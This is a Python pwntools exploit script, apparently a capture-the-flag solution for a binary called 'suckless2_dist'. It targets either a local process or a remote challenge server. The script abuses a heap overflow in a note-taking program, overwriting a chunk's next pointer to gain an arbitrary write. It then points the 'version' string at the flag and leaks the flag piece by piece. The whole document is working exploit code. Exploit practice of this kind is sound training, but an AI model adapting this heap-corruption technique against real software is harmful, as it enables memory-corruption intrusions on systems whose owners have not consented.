#!/usr/bin/env python3

from pwn import *

the_binary = "./suckless2_dist"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-h"]

def init_io():
    if args.REMOTE:
        io = remote("34.72.244.178", 8089)
    elif args.STRACE:
        io = process(["strace", "-o" ,"trace.txt", the_binary])
    else:
        io = process(the_binary)

    if args.GDB:
        gdb.attach(io, f"""
            file {the_binary}
            continue
        """)

    return io

class Const:
    flag_base = 0x000000000042a3d0

def add(io, sz, content):
    assert b"\n" not in content

    io.sendlineafter("> ", "new")    
    io.sendlineafter("length: ", str(sz))
    io.sendlineafter("note: ", content)

def leak_flag_part(offset):
    io = init_io()

    # Overwrite chunk next ptr for arbitrary write.
    where = elf.sym.version
    what = Const.flag_base + offset

    add(io, 1, b"A"*0x10 + p64(where))
    add(io, 1, b"X")
    add(io, 1, p64(what))

    io.sendlineafter("> ", "version")
    io.recvuntil("this is ")
    return io.recvuntil("\n", drop=True).decode()

def main():
    flag = ""
    flag_base = 0x000000000042a3d0

    while "}" not in flag:
        flag += leak_flag_part(offset=len(flag))
        log.info(f"Flag: {flag}")

if __name__ == "__main__":
    main()
